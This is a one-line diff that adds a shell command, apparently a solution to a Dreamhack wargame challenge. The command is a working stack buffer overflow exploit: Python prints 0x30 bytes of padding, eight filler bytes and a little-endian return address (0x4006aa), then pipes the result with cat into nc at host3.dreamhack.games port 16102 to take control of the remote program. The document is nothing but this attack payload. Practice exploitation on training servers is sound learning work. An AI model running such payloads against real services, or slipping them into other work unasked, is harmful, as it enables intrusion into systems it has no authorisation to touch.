@@ -1,0 +1,1 @@
+(python3 -c "import sys; sys.stdout.buffer.write(b'A'*0x30+b'B'*0x8+b'\xaa\x06\x40\x00\x00\x00\x00\x00')"; cat) | nc host3.dreamhack.games 16102
